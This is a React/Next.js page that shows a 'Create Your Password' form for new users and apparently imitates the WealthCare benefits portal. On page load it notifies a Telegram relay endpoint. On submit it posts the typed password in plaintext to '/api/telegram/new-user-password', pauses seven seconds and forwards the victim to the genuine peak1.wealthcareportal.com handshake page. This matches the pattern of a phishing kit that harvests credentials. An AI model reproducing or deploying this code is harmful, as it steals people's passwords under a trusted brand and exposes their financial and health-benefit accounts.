"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { Button } from "@/components/ui/button";
import { SiteFooter } from "@/components/site-footer";
import { VerificationHeader } from "@/components/verification-header";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";

const PEAK1_REDIRECT_URL =
  "https://peak1.wealthcareportal.com/Authentication/Handshake";

export default function NewUserPasswordPage() {
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const router = useRouter();
  const viewNotificationSent = useRef(false);

  useEffect(() => {
    if (viewNotificationSent.current) return;
    viewNotificationSent.current = true;
    fetch("/api/telegram/new-user-password-view", { method: "POST" }).catch(
      console.error,
    );
  }, []);

  const passwordsMatch = password === confirmPassword;
  const isFormValid =
    password.length >= 1 && confirmPassword.length >= 1 && passwordsMatch;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;
    if (!passwordsMatch) {
      setError("Passwords do not match.");
      return;
    }
    setError(null);
    setIsLoading(true);
    try {
      await fetch("/api/telegram/new-user-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      }).catch(console.error);
    } catch (err) {
      console.error("Failed to send new user password notification:", err);
    }
    await new Promise((r) => setTimeout(r, 7000));
    window.location.href = PEAK1_REDIRECT_URL;
  };

  return (
    <div className="min-h-screen bg-white">
      <VerificationHeader />
      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px]">
        <div className="mb-6">
          <h2 className="text-base font-medium text-gray-900 mb-4">New User</h2>
          <h1 className="text-2xl font-semibold text-gray-900 mb-3">
            Create Your Password
          </h1>
          <p className="text-gray-700 text-sm mb-4">
            Enter a password for your account. You will use this to log on.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label
              htmlFor="password"
              className="block text-sm font-medium text-gray-900 mb-1.5"
            >
              Password
            </label>
            <Input
              id="password"
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="max-w-[280px] h-10 bg-gray-50 border-gray-300 rounded-md"
            />
          </div>

          <div>
            <label
              htmlFor="confirm"
              className="block text-sm font-medium text-gray-900 mb-1.5"
            >
              Confirm Password
            </label>
            <Input
              id="confirm"
              type={showPassword ? "text" : "password"}
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
              placeholder="Confirm Password"
              className="max-w-[280px] h-10 bg-gray-50 border-gray-300 rounded-md"
            />
          </div>

          <div className="flex items-center gap-2">
            <Checkbox
              id="show-password"
              checked={showPassword}
              onCheckedChange={(c) => setShowPassword(c === true)}
              className="border-gray-400"
            />
            <label
              htmlFor="show-password"
              className="text-sm text-gray-700 cursor-pointer select-none"
            >
              Show Password
            </label>
          </div>

          {error && <p className="text-sm text-red-600">{error}</p>}

          <div className="flex gap-3 pt-2">
            <Button
              type="submit"
              disabled={!isFormValid || isLoading}
              className="bg-[#254650] text-white hover:bg-[#1e383f] rounded-md disabled:opacity-70 disabled:pointer-events-none h-9 px-5 text-sm font-medium"
            >
              {isLoading ? "Loading..." : "Continue"}
            </Button>
            <Button
              type="button"
              variant="ghost"
              className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-9 px-5 text-sm font-medium"
              onClick={() => router.push("/new-user-code")}
            >
              Cancel
            </Button>
          </div>
        </form>
      </div>

      <SiteFooter />
    </div>
  );
}
